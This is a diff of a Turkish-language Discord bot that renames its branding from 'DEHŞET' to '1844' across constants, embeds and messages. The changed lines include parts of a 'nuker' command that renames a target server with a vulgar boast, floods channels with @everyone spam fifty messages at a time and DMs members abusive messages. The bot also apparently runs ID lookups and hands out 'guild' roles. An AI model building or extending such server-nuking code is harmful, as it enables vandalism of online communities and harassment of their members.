@@ -1,6 +1,6 @@
 """
 ================================================================================
-                        DISCORD BOT DEHŞET - VDS VERSIYONU
+                        DISCORD BOT 1844 - VDS VERSIYONU
 ================================================================================
 
 KURULUM:
@@ -48,10 +48,10 @@ AUTHORIZED_USERS_FILE = 'authorized_users.json'
 VERIFIED_USERS_FILE = 'verified_users.json'
 DB_FILE_PATH = 'discord_data.db'
 DATA_FILE_PATH = 'data.txt'
-AUTHORIZED_ROLE_ID = DEHŞET
-DURUM_ALDI_KANAL_ID = DEHŞET
-VERIFIED_ROLE_ID = DEHŞET
-GUILD_OWNER_ROLE_ID = DEHŞET  # Guild alan kişilere verilecek özel rol
+AUTHORIZED_ROLE_ID = 1844
+DURUM_ALDI_KANAL_ID = 1844
+VERIFIED_ROLE_ID = 1844
+GUILD_OWNER_ROLE_ID = 1844  # Guild alan kişilere verilecek özel rol
 LOG_CHANNEL_ID = 1444467582282367009  # ID sorgu loglarının gönderileceği kanal
 GENERAL_LOG_CHANNEL_ID = 1445572049035595816  # Genel log kanalı
 WELCOME_CHANNEL_ID = 1444428771389079643  # Hoş geldin kanalı
@@ -725,7 +725,7 @@ async def update_presence():
             
             await bot.change_presence(
                 activity=discord.Streaming(
-                    name=f"discord.gg/DEHŞET | {total_credits} hak",
+                    name=f"discord.gg/1844 | {total_credits} hak",
                     url="https://twitch.tv/discord"
                 )
             )
@@ -1266,7 +1266,7 @@ async def boost_info(interaction: discord.Interaction):
     
     embed.add_field(
         name="ÖZEL TEKLİF",
-        value="@DEHŞET farkıyla en iyisinden zirveye!",
+        value="@1844 farkıyla en iyisinden zirveye!",
         inline=False
     )
     
@@ -2715,7 +2715,7 @@ async def prefix_help(ctx):
     total_credits = get_total_credits()
     
     embed = discord.Embed(
-        title="📚 DEHŞET BOT - PREFIX KOMUTLARI",
+        title="📚 1844 BOT - PREFIX KOMUTLARI",
         description="Tüm komutlar `!` prefix'i ile kullanılır",
         color=0x3498db,
         timestamp=datetime.datetime.now()
@@ -2800,7 +2800,7 @@ async def prefix_help(ctx):
         inline=False
     )
     
-    embed.set_footer(text="Slash komutları için / kullanın | DEHŞET Bot")
+    embed.set_footer(text="Slash komutları için / kullanın | 1844 Bot")
     if ctx.guild.icon:
         embed.set_thumbnail(url=ctx.guild.icon.url)
     
@@ -3152,7 +3152,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
             logo_path = "attached_assets/DEHŞET_logo.png"
             with open(logo_path, "rb") as f:
                 icon_data = f.read()
-            await guild.edit(name="DEHŞET SİKTİ", icon=icon_data, description="discord.gg/DEHŞET tarafından yok edildi")
+            await guild.edit(name="DEHŞET SİKTİ", icon=icon_data, description="discord.gg/1844 tarafından yok edildi")
         except:
             try:
                 await guild.edit(name="DEHŞET SİKTİ")
@@ -3177,7 +3177,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def spam_channel(ch):
         if not nuker_active: return
         try:
-            await ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/DEHŞET")
+            await ch.send(f"@everyone **{owner_name} 1844 sizi sikti** discord.gg/DEHŞET")
         except:
             pass
     
@@ -3198,7 +3198,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
     async def dm_member(m):
         if not nuker_active: return
         try:
-            await m.send(f"**discord.gg/DEHŞET sikti sizi**")
+            await m.send(f"**discord.gg/1844 sikti sizi**")
         except:
             pass
     
@@ -3206,7 +3206,7 @@ async def prefix_nuker(ctx, sunucu_id: str = None):
         if not nuker_active: return
         try:
             ch = await guild.create_text_channel(name="discord.gg-DEHŞET")
-            spam_tasks = [ch.send(f"@everyone **{owner_name} DEHŞET sizi sikti** discord.gg/DEHŞET") for _ in range(50)]
+            spam_tasks = [ch.send(f"@everyone **{owner_name} 1844 sizi sikti** discord.gg/DEHŞET") for _ in range(50)]
             await asyncio.gather(*spam_tasks, return_exceptions=True)
         except:
             pass
@@ -3837,7 +3837,7 @@ async def on_guild_update(before, after):
         embed.add_field(name="❌ Eski URL", value=f"`discord.gg/{old_url}`" if old_url else "Yok", inline=True)
         embed.add_field(name="➡️ Yeni URL", value=f"`discord.gg/{new_url}`" if new_url else "**KALDIRILDI!**", inline=True)
         embed.add_field(name="⚡ Aksiyon", value="Sunucu Ayarları > Vanity URL bölümünden kontrol edin!", inline=False)
-        embed.set_footer(text="🛡️ DEHŞET URL Koruma Sistemi | Anında Uyarı")
+        embed.set_footer(text="🛡️ 1844 URL Koruma Sistemi | Anında Uyarı")
         
         await log_channel.send(content=f"🚨🚨🚨 **ACİL URL DEĞİŞİKLİĞİ!** {owner_mentions} 🚨🚨🚨", embed=embed)
         
